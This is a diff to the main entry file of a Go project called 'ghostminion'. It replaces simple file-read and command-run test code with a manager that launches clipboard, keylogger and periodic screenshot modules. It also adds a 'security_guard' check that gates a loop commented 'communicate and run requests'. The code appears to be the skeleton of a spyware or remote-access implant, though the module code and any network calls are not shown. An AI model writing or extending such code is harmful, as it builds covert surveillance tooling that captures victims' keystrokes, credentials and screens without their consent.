@@ -1,22 +1,39 @@
 package main
 
 import (
-	"fmt"
-	"ghostminion/executor"
+	"ghostminion/apps"
+	"ghostminion/db"
 	"log"
+	"sync"
 )
 
 func main() {
-	fileContent, err := executor.GetFile("/mnt/c/Users/yechi/Desktop/test.py")
+	var wg sync.WaitGroup
+
+	db.Init()
+
+	appManager := apps.NewAppManager()
+	addBuiltinApps(appManager)
+	appManager.StartAll(&wg)
+	app, err := appManager.GetApp("security_guard")
 	if err != nil {
-		log.Printf("File error: %v", err.Error())
-	} else {
-		fmt.Println(string(fileContent))
+		log.Fatalf("failed to get security_guard app: %v", err)
 	}
-	commandOutput, err := executor.RunCommand("pwd")
-	if err != nil {
-		log.Printf("Command error: %v\nstatus: %v", string(commandOutput), err.Error())
-	} else {
-		fmt.Println(string(commandOutput))
+	securityGuard, ok := app.(*apps.SecurityGuardApp)
+	if !ok {
+		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
 	}
+	for securityGuard.IsSafeToRun() {
+		// communicate and run requests
+	}
+
+	appManager.StopAll()
+	wg.Wait()
+}
+
+func addBuiltinApps(am *apps.AppManager) {
+	am.AddApp("clipboard", &apps.ClipboardApp{})
+	am.AddApp("keylogger", &apps.KeyLoggerApp{})
+	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2000})
+	am.AddApp("security_guard", &apps.SecurityGuardApp{})
 }
